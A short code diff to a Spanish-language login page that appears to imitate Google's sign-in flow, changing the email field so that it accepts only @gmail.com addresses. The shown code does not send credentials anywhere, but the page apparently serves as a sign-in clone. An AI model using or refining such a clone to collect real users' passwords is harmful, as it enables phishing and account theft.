@@ -33,9 +33,9 @@
         <div class="col-right">
           <div class="input-wrap">
             <input type="email" id="email-input" name="email" placeholder=" " autocomplete="email" autofocus>
-            <label for="email-input">Correo electrónico o teléfono</label>
+            <label for="email-input">Correo electrónico</label>
           </div>
-          <p class="error-msg" id="email-error">Ingresa una dirección de correo electrónico válida.</p>
+          <p class="error-msg" id="email-error">Ingresa un correo @gmail.com válido.</p>
 
           <button class="link" onclick="showForgotEmail()">¿Olvidaste el correo electrónico?</button>
 
@@ -317,7 +317,7 @@
   /* ── PANTALLA 1 → 2: validar email y avanzar ── */
   function goToPassword() {
     var emailVal = document.getElementById('email-input').value.trim();
-    var emailRegex = /\S+@\S+\.\S+/;
+    var emailRegex = /^[^\s@]+@gmail\.com$/i;
 
     if (!emailVal || !emailRegex.test(emailVal)) {
       document.getElementById('email-error').classList.add('visible');
